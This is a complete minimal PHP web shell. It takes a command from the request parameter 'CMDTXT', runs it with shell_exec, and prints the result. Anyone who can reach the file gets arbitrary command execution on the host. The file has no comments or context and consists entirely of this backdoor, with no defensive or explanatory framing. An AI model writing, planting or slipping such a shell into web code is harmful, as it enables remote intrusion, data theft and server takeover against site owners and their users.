<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
if($cmdCommand != '') 
	print shell_exec($cmdCommand);
?>